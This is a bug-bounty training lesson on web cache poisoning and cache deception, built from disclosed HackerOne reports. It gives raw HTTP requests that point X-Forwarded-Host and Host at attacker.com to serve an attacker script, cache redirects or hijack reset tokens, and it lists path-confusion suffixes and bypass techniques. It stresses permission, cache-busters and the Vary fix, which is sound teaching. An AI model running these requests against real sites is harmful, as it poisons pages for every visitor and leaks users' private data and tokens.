# Lesson 07 — Web Cache Poisoning & Web Cache Deception

> **Source material:** top disclosed web-cache reports from HackerOne (TOPWEBCACHE index) —
> PayPal [#488147](https://hackerone.com/reports/488147) ($18,900) and [#622122](https://hackerone.com/reports/622122) ($9,700), Shopify [#1096609](https://hackerone.com/reports/1096609) ($2,900), Basecamp [#919175](https://hackerone.com/reports/919175)
> ($1,700), Shopify [#1271944](https://hackerone.com/reports/1271944) ($800), GSA [#303730](https://hackerone.com/reports/303730) ($750); PortSwigger cache research
> **Format:** writeup → mechanism → raw traffic → bypasses → escalation → practice
> **Status:** Lesson 7 of the study track
> **Category:** 8. Caching & Infrastructure — see [CURRICULUM](CURRICULUM.md#8-caching--infrastructure)

---

## 1. The one-line definition

**A cache sits between you and the server. It stores a response against a *key*. Anything in the
request that isn't part of that key is invisible to the cache — and if that unkeyed input reaches
the response, you can poison what every subsequent visitor receives.**

Two distinct bugs share this mechanism:

| Bug | Direction | The idea |
|---|---|---|
| **Cache poisoning** | you inject **into** the cache | Get your payload stored under a URL others will request |
| **Cache deception** | you extract **from** the cache | Trick the cache into storing a *private* page, then read it |

Both pay, both are under-hunted, and both are **extremely high impact** — poisoning hits every
user who requests that URL; deception leaks one user's private data to whoever asks next.

---

## 2. Real money from real web cache reports

| Report | Program | Bounty | The bug |
|---|---|---|---|
| [#488147](https://hackerone.com/reports/488147) | **PayPal** | **$18,900** | Stored XSS on `paypal.com/signin` via **cache poisoning** |
| [#622122](https://hackerone.com/reports/622122) | **PayPal** | **$9,700** | **DoS** via web cache poisoning |
| [#1096609](https://hackerone.com/reports/1096609) | Shopify | **$2,900** | **Host header** cache poisoning → DoS on `themes.shopify.com` |
| [#919175](https://hackerone.com/reports/919175) | Basecamp | **$1,700** | HTTP **request smuggling** → web cache poisoning |
| [#1271944](https://hackerone.com/reports/1271944) | Shopify | **$800** | **Cache deception** → personal info + **CSRF tokens** leaked |
| [#303730](https://hackerone.com/reports/303730) | GSA | **$750** | Defacement of `catalog.data.gov` via cache poisoning → **stored DOMXSS** |
| [#492841](https://hackerone.com/reports/492841) | Postmates | **$500** | Cache poisoning → user information disclosure |
| [#1530066](https://hackerone.com/reports/1530066) | Algolia | **$400** | Cache deception → personal information leakage |
| [#893353](https://hackerone.com/reports/893353) | Mail.ru | **$400** | Cache information leakage at `sbermarket.ru` |
| [#394016](https://hackerone.com/reports/394016) | Discourse | **$256** | Cache deception → XSS |
| [#593712](https://hackerone.com/reports/593712) | Vanilla | **$150** | Cache deception on `/messages/all` |

**Zero-dollar but high-signal** — read these for the technique, not the payout:
- [Discourse #260697](https://hackerone.com/reports/260697) — CSRF tokens on pages without
  `no-cache` headers → **ATO via CloudFlare cache deception**. The mechanism is textbook.
- [Glassdoor #1424094](https://hackerone.com/reports/1424094) / [#1621540](https://hackerone.com/reports/1621540) —
  cache poisoning → stored XSS and DoS
- [TikTok #1484468](https://hackerone.com/reports/1484468) — info leakage via Ads cache deception
- [OLX #537564](https://hackerone.com/reports/537564) — cache deception → **name/user_id enumeration**

**The pattern in the payouts:** poisoning that reaches **XSS** or **DoS** on a high-traffic
endpoint pays thousands. Deception pays less per finding but is far easier to find — and when it
leaks **CSRF tokens or session data**, it escalates to ATO.

---

## 3. How a cache decides — the only concept you need

A cache stores `response` under `key`. Simplified:

```
KEY   = method + host + path + (sometimes query string, sometimes Vary headers)
UNKEYED = everything else: most headers, some query params, cookies, body
```

**If an unkeyed input influences the response, and the response gets cached, you control what
the next visitor sees.**

The three things to establish, in order:

1. **Is there a cache?** Look for `X-Cache: hit|miss`, `Age`, `CF-Cache-Status`, `X-Served-By`,
   `X-Cache-Hits`, `Via`.
2. **What's in the key?** Change one input at a time and watch whether you get a `hit` or `miss`.
   A `miss` means that input is keyed (safe). A `hit` with a changed response means it's **unkeyed**
   (interesting).
3. **Does the unkeyed input reach the response?** If yes, you have a candidate.

> **Cache-buster discipline:** while testing, always append a unique query param
> (`?cb=1337`) so you poison *your own* cache entry and never the real one. Remove it only for
> the final demonstration — and only on a target whose program allows it.

---

## 4. The canonical attacks — raw traffic

### 4.1 Unkeyed header → XSS for every visitor

```http
GET /en?cb=1337 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

If the app builds absolute URLs from `X-Forwarded-Host` and the response is cached:

```html
<script src="https://attacker.com/static/app.js"></script>
```

Every subsequent visitor to `/en` loads **your** script. That is the PayPal [#488147](https://hackerone.com/reports/488147) shape —
$18,900 for one header.

### 4.2 Unkeyed header → redirect → DoS

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

If the app 301-redirects to that host and the redirect is cached, every visitor is bounced off
the site. That's PayPal [#622122](https://hackerone.com/reports/622122) ($9,700) and Shopify [#1096609](https://hackerone.com/reports/1096609) ($2,900).

### 4.3 Web cache deception — the reverse direction

```
Victim is logged in and requests:   GET /account/profile
Attacker requests:                  GET /account/profile.css
```

If the cache treats `.css` as a static, cacheable extension but the app ignores the suffix and
serves the **private profile page**, the cache stores the victim's private page under
`/account/profile.css` — and the attacker reads it.

**Common path-confusion suffixes:**

```
/account/profile.css        /account/profile.js        /account/profile.png
/account/profile;.css       /account/profile%00.css    /account/profile/.css
/account/profile.css?      /account/profile.json
```

### 4.4 Host header injection (the same family)

```http
GET /reset-password?token=... HTTP/1.1
Host: attacker.com
```

If the password-reset link is built from the `Host` header, the victim's reset token is mailed
pointing at **your** domain. And if that response is cacheable, you can poison it for everyone.

---

## 5. Where it hides — the surface map

**Cache poisoning candidates — any unkeyed input that reaches the response:**

| Input | Why it's often unkeyed |
|---|---|
| `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server` | used for absolute URLs, not part of the cache key |
| `X-Forwarded-Scheme`, `X-Forwarded-Proto` | used to build URLs / decide redirects |
| `X-Original-URL`, `X-Rewrite-URL` | used by some frameworks to reroute |
| `X-Forwarded-For` | sometimes echoed into pages ("your IP is…") |
| Query params the cache ignores | **parameter cloaking** — some caches key only certain params |
| Cookies the cache ignores | when `Vary: Cookie` is missing but the app reads cookies |
| `Accept-Encoding` variants | cache normalises, app doesn't |

**Cache deception candidates — endpoints that serve private data:**

- `/account`, `/profile`, `/settings`, `/billing`, `/orders`, `/messages`, `/inbox`
- any page containing a **CSRF token**, an API key, or a session identifier
- API endpoints that accept a path suffix

**The best target profile:** a site behind Cloudflare/Fastly/Akamai that serves
authenticated pages, with permissive cache rules on static extensions.

---

## 6. Bypasses & advanced technique

| Technique | How it works |
|---|---|
| **Fat GET** | Body params on a `GET` — many caches don't key the body, but the app reads it |
| **Parameter cloaking** | `?utm=1&callback=evil` where the cache keys only `utm` and the app reads `callback` |
| **Cache key normalisation** | The cache normalises `%2f`, `//`, `..`, or case; the origin doesn't (or vice versa) |
| **Vary-header abuse** | If `Vary` includes a header you control, you get a private cache bucket you can poison |
| **Unkeyed cookie** | App reads a cookie the cache ignores → poison with `Cookie: x=payload` |
| **Cache the redirect** | Poison a 301 so every visitor is bounced — cheapest DoS available |
| **Multiple headers combined** | `X-Forwarded-Host` + `X-Forwarded-Scheme` together trigger the vulnerable branch |
| **Request smuggling → cache poisoning** | Desync to inject a response the cache stores (Basecamp, $1,700 — see Lesson 08) |
| **Cache deception via rewrite** | `/profile/nonexistent.css` where the router ignores the suffix |

**Detection of the deception bug specifically:** the tell is a response that is
**`Cache-Control: public`** (or has no `Cache-Control` at all) while serving **personalised**
content. That mismatch is the vulnerability.

---

## 7. Escalation — what makes it pay

```
DoS via cached redirect          → $2,900–$9,700  (PayPal, Shopify)
Stored XSS for every visitor     → $18,900        (PayPal)
Deception → CSRF token           → ATO
Deception → session/API token    → ATO
Deception → PII enumeration      → $400–$800      (Shopify, Algolia)
Poisoning a JS dependency        → XSS at scale
```

**The escalation ladder:**

1. **Prove the cache** — `X-Cache: hit` on your own cache-buster.
2. **Prove the unkeyed input reaches the response** — reflected in the body, a redirect, or a URL.
3. **Prove persistence** — remove the cache-buster, request the clean URL, get your payload back.
4. **Prove blast radius** — request from a different session/IP and still get it.
5. **Escalate the payload** — redirect → XSS; XSS → session theft; token leak → ATO.

> **Step 3 is where most reports die.** A payload that only shows up on your own cache-buster
> proves nothing. You must show a **clean URL** serving **your** response to a **different
> client**. That's the finding.

**Severity reality:** poisoning that reaches XSS or DoS on a high-traffic page is High/Critical.
Deception leaking only non-sensitive data is Low/Medium — the payout depends entirely on **what
you leak**.

---

## 8. How to test — methodology

```
01. Identify the cache: X-Cache, Age, CF-Cache-Status, X-Served-By, Via
02. Find the cache key: send two requests differing in ONE input, watch hit vs miss
03. Always append a unique cache-buster (?cb=<random>) while testing
04. Enumerate unkeyed inputs: X-Forwarded-*, X-Host, X-Original-URL, custom headers
05. Check whether each unkeyed input reaches the response (reflection, URL, redirect)
06. Check Vary: which headers does the cache respect?
07. For deception: request an authenticated page, then the same path with a static suffix
08. Compare responses — did the private page come back under the static URL?
09. Check Cache-Control on private pages — missing or "public" is the bug
10. Verify persistence: drop the cache-buster, request the clean URL
11. Verify blast radius: request from a different IP/session, confirm your payload arrives
12. Escalate: redirect → XSS, or leak → token/CSRF → ATO
13. Report with the exact header/param, the cached response, and the cross-client proof
```

**Do NOT test poisoning on production without permission.** You are deliberately corrupting
responses for other users. Many programs scope cache poisoning to a staging host or require a
cache-buster in the PoC. **Read the program's rules first** — this class is one where a careless
test is a real outage.

---

## 9. Common mistakes

- **Testing without a cache-buster.** You poison the live entry and take the site down for real
  users. This is the #1 way to get banned.
- **Stopping at "my payload reflected."** Reflection without **persistence** and **cross-client
  delivery** is not a finding.
- **Confusing a `hit` on your own entry.** `X-Cache: hit` after your own request proves only that
  you cached *your* request. Prove a **different client** gets it.
- **Assuming no `Vary` means no keying.** Test it; don't infer it.
- **Ignoring `Cache-Control: private`.** If the app sets it correctly, deception won't work —
  check before spending time.
- **Not checking the CDN's own rules.** Cloudflare's default extension list, Fastly's VCL,
  Akamai's rules — the deception suffix must match what *that* CDN treats as static.
- **Forgetting the DoS angle.** A cached redirect is the cheapest high-severity finding in this
  class and is often overlooked because everyone chases XSS.
- **Testing on a program that forbids it.** Read the scope.

---

## 10. Practice targets

| Target | Why |
|---|---|
| **PortSwigger Web Cache Poisoning labs** | the full progression: unkeyed header, unkeyed cookie, parameter cloaking, cache key normalisation |
| **PortSwigger Web Cache Deception labs** | the deception path-confusion variants |
| **A local app behind a local cache** | run nginx/Varnish in front of a small app in the lab VM — poison your own stack |
| **Any CDN-fronted site in scope** | check `X-Cache` headers first; if there's no cache, there's no bug |

**Assignment:** in the lab VM, put **Varnish or nginx** in front of a small app that renders a
page using `X-Forwarded-Host`, and configure the cache to ignore that header. Then:

1. Prove the cache works (`X-Cache: hit` on a cache-buster)
2. Poison your own entry with `X-Forwarded-Host: evil.test`
3. Drop the cache-buster and confirm the clean URL returns your poisoned response
4. Confirm a second client (different container/session) receives it too
5. Then **add `Vary: X-Forwarded-Host`** and confirm the bug dies

Step 5 teaches the fix. Then repeat the whole thing for **deception**: add a logged-in page, and
try to make the cache store it under `/page.css`.

---

## 11. Key takeaways

1. **A cache stores a response against a key.** Anything unkeyed that reaches the response is
   your injection point.
2. **Poisoning hits everyone; deception leaks one person.** Both are High when they matter.
3. **PayPal paid $18,900 for one header** (`X-Forwarded-Host` → XSS). The class is high-value and
   low-competition.
4. **Cache-buster discipline is non-negotiable.** Testing without one is a real outage.
5. **Persistence + cross-client delivery = the finding.** Reflection alone proves nothing.
6. **`Cache-Control: public` on a private page is the deception tell.** That mismatch *is* the bug.
7. **DoS via a cached redirect is the cheapest high-severity bug** in this class — don't skip it.
8. **Request smuggling feeds cache poisoning** (Basecamp, $1,700) — the classes chain.

---

## 12. What to study next

| You learned | Study next |
|---|---|
| Cache poisoning | **Request smuggling** — the desync that lets you inject into caches (Lesson 08) |
| Cache deception via path confusion | **Path normalisation & routing confusion** |
| Host header injection | Password-reset poisoning, SSRF via Host |
| Poisoning → XSS | XSS escalation (Lesson 06) |
| CDN cache rules | Cloudflare/Fastly/Akamai-specific behaviour |
| DoS via cached redirect | Availability bugs as a paid class |

---

## 13. Reference index

| # | Report | Bounty | Class |
|---|---|---|---|
| 1 | [PayPal #488147](https://hackerone.com/reports/488147) | **$18,900** | cache poisoning → stored XSS |
| 2 | [PayPal #622122](https://hackerone.com/reports/622122) | **$9,700** | cache poisoning → DoS |
| 3 | [Shopify #1096609](https://hackerone.com/reports/1096609) | **$2,900** | host header cache poisoning → DoS |
| 4 | [Basecamp #919175](https://hackerone.com/reports/919175) | **$1,700** | smuggling → cache poisoning |
| 5 | [Shopify #1271944](https://hackerone.com/reports/1271944) | **$800** | cache deception → PII + CSRF tokens |
| 6 | [GSA #303730](https://hackerone.com/reports/303730) | **$750** | poisoning → stored DOMXSS (defacement) |
| 7 | [Postmates #492841](https://hackerone.com/reports/492841) | **$500** | poisoning → user info |
| 8 | [Algolia #1530066](https://hackerone.com/reports/1530066) | **$400** | cache deception → PII |
| 9 | [Mail.ru #893353](https://hackerone.com/reports/893353) | **$400** | cache info leakage |
| 10 | [Discourse #394016](https://hackerone.com/reports/394016) | **$256** | cache deception → XSS |
| 11 | [Vanilla #593712](https://hackerone.com/reports/593712) | **$150** | cache deception |
| 12 | [Discourse #260697](https://hackerone.com/reports/260697) | $0 | CSRF tokens + **ATO** via cache deception |
| 13 | [Glassdoor #1424094](https://hackerone.com/reports/1424094) | $0 | poisoning → stored XSS |
| 14 | [Glassdoor #1621540](https://hackerone.com/reports/1621540) | $0 | poisoning → XSS + DoS |
| 15 | [TikTok #1484468](https://hackerone.com/reports/1484468) | $0 | ads cache deception → info leak |
| 16 | [OLX #537564](https://hackerone.com/reports/537564) | $0 | deception → **user_id enumeration** |
| 17 | [Nextcloud #429747](https://hackerone.com/reports/429747) | $0 | cache poisoning |
| 18 | [Smule #504514](https://hackerone.com/reports/504514) | $0 | poisoning → CSRF token disclosure |
| 19 | [Acronis #1010858](https://hackerone.com/reports/1010858) | $0 | cache poisoning |
| 20 | [Kaspersky #1185028](https://hackerone.com/reports/1185028) | $0 | multi-domain cache deception |
